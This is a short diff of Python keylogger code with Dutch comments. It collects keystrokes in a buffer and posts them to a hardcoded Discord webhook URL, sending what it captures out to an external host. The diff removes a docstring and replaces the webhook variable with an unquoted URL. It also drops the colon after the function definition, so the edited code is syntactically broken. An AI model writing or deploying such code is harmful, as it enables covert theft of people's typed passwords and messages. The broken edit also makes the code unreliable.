@@ -12,14 +12,10 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1336013596626387026/Sqvc
 
 keystrokes_buffer = []
 buffer_lock = threading.Lock()
-
-def send_to_discord_webhook(keystrokes):
-    """
-    Stuurt een blok met toetsaanslagen naar de Discord webhook.
-    """
+def send_to_discord_webhook(keystrokes)
     payload = {"content": keystrokes}
     try:
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
+        response = requests.post(http://www.discord.com/, json=payload, timeout=5)
         response.raise_for_status()
         logging.info("Toetsaanslagen succesvol naar Discord verzonden.")
     except requests.RequestException as e:
